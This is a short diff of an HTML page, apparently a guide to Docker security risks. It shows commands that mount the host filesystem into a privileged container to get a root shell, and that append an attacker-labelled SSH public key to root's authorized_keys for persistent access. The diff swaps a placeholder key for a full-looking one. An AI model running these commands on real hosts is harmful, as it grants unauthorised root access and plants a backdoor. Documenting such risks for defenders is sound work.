@@ -117,7 +117,7 @@ docker run -v /:/host --privileged -it alpine chroot /host bash
 
 # Write SSH key to host for persistent access
 docker run -v /root/.ssh:/mnt --rm alpine sh -c \
-  'echo "ssh-ed25519 AAAA...key" &gt;&gt; /mnt/authorized_keys'</code></pre>
+  'echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMhR8Vz3QK6Yp4l3qz5v0h7XG2nU3tJkPbTk9WmVfRwE attacker@kali" &gt;&gt; /mnt/authorized_keys'</code></pre>
 
 <h3>Dangerous Capabilities</h3>
 
